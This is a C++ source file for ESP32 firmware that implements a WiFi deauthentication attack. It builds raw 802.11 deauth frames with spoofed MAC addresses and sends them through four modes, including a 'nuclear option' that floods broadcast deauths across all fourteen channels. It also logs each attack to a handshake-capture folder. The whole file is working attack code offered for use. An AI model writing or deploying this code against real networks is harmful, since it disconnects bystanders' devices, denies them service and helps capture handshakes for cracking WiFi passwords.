#include "wifi_deauth.h"
#include "config.h"
#include "rtc_clock.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <LittleFS.h>

namespace WiFiDeauth {

namespace {
volatile bool g_attacking = false;
volatile uint32_t g_packetCount = 0;

// IEEE 802.11 Deauthentication frame
typedef struct {
    uint8_t frameCtrl[2];
    uint8_t duration[2];
    uint8_t destAddr[6];
    uint8_t srcAddr[6];
    uint8_t bssidAddr[6];
    uint8_t seqCtrl[2];
    uint8_t reasonCode[2];
} DeauthFrame;

// Constants for frame building
static const uint8_t DEAUTH_FRAME_CTRL_0 = 0xC0;
static const uint8_t DEAUTH_DURATION_0 = 0x3A;
static const uint8_t DEAUTH_DURATION_1 = 0x01;
static const uint8_t DEAUTH_REASON_0 = 0x01;
static const uint8_t DEAUTH_REASON_1 = 0x00;
static const size_t MAC_ADDR_LEN = 6;
static const uint32_t MIN_DURATION_MS = 100;
static const uint32_t MAX_DURATION_MS = 600000;  // 10 minutes max

inline void buildDeauthFrame(DeauthFrame *frame, const uint8_t *dest,
                             const uint8_t *src, const uint8_t *bssid) {
    frame->frameCtrl[0] = DEAUTH_FRAME_CTRL_0;
    frame->frameCtrl[1] = 0x00;
    frame->duration[0] = DEAUTH_DURATION_0;
    frame->duration[1] = DEAUTH_DURATION_1;
    memcpy(frame->destAddr, dest, MAC_ADDR_LEN);
    memcpy(frame->srcAddr, src, MAC_ADDR_LEN);
    memcpy(frame->bssidAddr, bssid, MAC_ADDR_LEN);
    frame->seqCtrl[0] = esp_random() & 0xFF;
    frame->seqCtrl[1] = esp_random() & 0xFF;
    frame->reasonCode[0] = DEAUTH_REASON_0;
    frame->reasonCode[1] = DEAUTH_REASON_1;
}

inline void sendDeauthPacket(const uint8_t *dest, const uint8_t *src, const uint8_t *bssid) {
    if (unlikely(!dest || !src || !bssid)) return;

    DeauthFrame frame;
    buildDeauthFrame(&frame, dest, src, bssid);

    if (esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false) == ESP_OK) {
        g_packetCount++;
    }
}
}

DeauthResult nuclearOption(uint32_t durationMs) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (g_attacking) {
        result.error = "Attack already in progress";
        return result;
    }

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (durationMs < MIN_DURATION_MS || durationMs > MAX_DURATION_MS) {
        result.error = "Invalid duration (100ms-600s)";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    Serial.println("[WiFi Deauth] NUCLEAR OPTION ACTIVATED - ALL CHANNELS/BSSIDS");

    uint32_t startTime = millis();
    uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
    uint8_t channelIdx = 0;
    uint32_t nextChannelSwitch = startTime + 100;  // Switch every 100ms

    while (g_attacking && (millis() - startTime) < durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint32_t now = millis();

        // Switch channel periodically
        if (now >= nextChannelSwitch) {
            uint8_t ch = channels[channelIdx % 14];
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            channelIdx++;
            nextChannelSwitch = now + 100;
            result.channelsTested++;
        }

        // Send deauth to broadcast address (affects all clients)
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t randomMac[6];
        for (int i = 0; i < 6; i++) {
            randomMac[i] = (esp_random() % 255);
        }

        // Deauth from multiple spoofed APs
        sendDeauthPacket(broadcast, randomMac, broadcast);
        sendDeauthPacket(broadcast, randomMac, randomMac);

        delay(1);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    // Log
    String logFile = HANDSHAKE_CAPTURE_DIR;
    logFile += "/wifi_deauth.csv";
    File f = LittleFS.open(logFile, "a");
    if (f) {
        String line = RtcClock::isoTimestamp() + ",DEAUTH_NUCLEAR,";
        line += String(result.packetsSent) + " packets," + String(result.channelsTested) + " channels";
        f.println(line);
        f.close();
    }

    return result;
}

DeauthResult broadcastDeauth(const DeauthConfig &config) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (g_attacking) {
        result.error = "Attack already in progress";
        return result;
    }

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (config.durationMs < MIN_DURATION_MS || config.durationMs > MAX_DURATION_MS) {
        result.error = "Invalid duration (100ms-600s)";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    Serial.printf("[WiFi Deauth] Broadcast deauth on channel %d\n", config.targetChannel);

    esp_wifi_set_channel(config.targetChannel, WIFI_SECOND_CHAN_NONE);

    uint32_t startTime = millis();
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t seqNum = 0;

    while (g_attacking && (millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint8_t spoofedMac[6];
        if (config.randomizeMac) {
            for (int i = 0; i < 6; i++) {
                spoofedMac[i] = (esp_random() % 255);
            }
        } else {
            memcpy(spoofedMac, config.targetBssid, 6);
            if (config.repeatSequence) {
                spoofedMac[5] = seqNum++;
            }
        }

        sendDeauthPacket(broadcast, spoofedMac, config.targetBssid);

        delay(1000 / config.packetsPerSec);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    return result;
}

DeauthResult channelSweep(const DeauthConfig &config) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (g_attacking) {
        result.error = "Attack already in progress";
        return result;
    }

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (config.durationMs < MIN_DURATION_MS || config.durationMs > MAX_DURATION_MS) {
        result.error = "Invalid duration (100ms-600s)";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    uint32_t startTime = millis();
    uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
    uint8_t channelIdx = 0;
    uint32_t nextSwitch = startTime;
    uint32_t durationPerChannel = config.durationMs / 14;

    while (g_attacking && (millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint32_t now = millis();

        if (now >= nextSwitch) {
            uint8_t ch = channels[channelIdx % 14];
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            Serial.printf("[WiFi Deauth] Channel %d\n", ch);
            channelIdx++;
            nextSwitch = now + durationPerChannel;
            result.channelsTested++;
        }

        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t randomMac[6];
        for (int i = 0; i < 6; i++) {
            randomMac[i] = (esp_random() % 255);
        }

        sendDeauthPacket(broadcast, randomMac, broadcast);

        delay(1);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    return result;
}

DeauthResult targeted(const DeauthConfig &config) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (g_attacking) {
        result.error = "Attack already in progress";
        return result;
    }

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (config.durationMs < MIN_DURATION_MS || config.durationMs > MAX_DURATION_MS) {
        result.error = "Invalid duration (100ms-600s)";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    esp_wifi_set_channel(config.targetChannel, WIFI_SECOND_CHAN_NONE);

    uint32_t startTime = millis();

    while (g_attacking && (millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        sendDeauthPacket(config.targetClient, config.targetBssid, config.targetBssid);

        delay(1000 / config.packetsPerSec);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    return result;
}

void stop() {
    g_attacking = false;
    Serial.println("[WiFi Deauth] Attack stopped");
}

bool isActive() {
    return g_attacking;
}

DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bool broadcastClients) {
    DeauthConfig config;
    memset(&config, 0, sizeof(config));
    config.mode = broadcastClients ? BROADCAST : TARGETED;
    config.durationMs = durationMs;
    config.packetsPerSec = 150;
    config.targetChannel = 6;

    // Parse BSSID string to bytes (validate format AA:BB:CC:DD:EE:FF)
    uint8_t bssid[6] = {0};
    DeauthResult result = {false, 0, 0, 0, ""};

    if (targetBSSID.length() != 17) {
        result.error = "Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)";
        return result;
    }

    for (int i = 0; i < 6; i++) {
        String hex = targetBSSID.substring(i * 3, i * 3 + 2);
        char *endptr = nullptr;
        long value = strtol(hex.c_str(), &endptr, 16);

        if (endptr == hex.c_str() || value < 0 || value > 255) {
            result.error = "Invalid BSSID hex value";
            return result;
        }
        bssid[i] = (uint8_t)value;
    }
    memcpy(config.targetBssid, bssid, 6);

    if (config.mode == BROADCAST) {
        return broadcastDeauth(config);
    } else {
        return targeted(config);
    }
}

}  // namespace WiFiDeauth
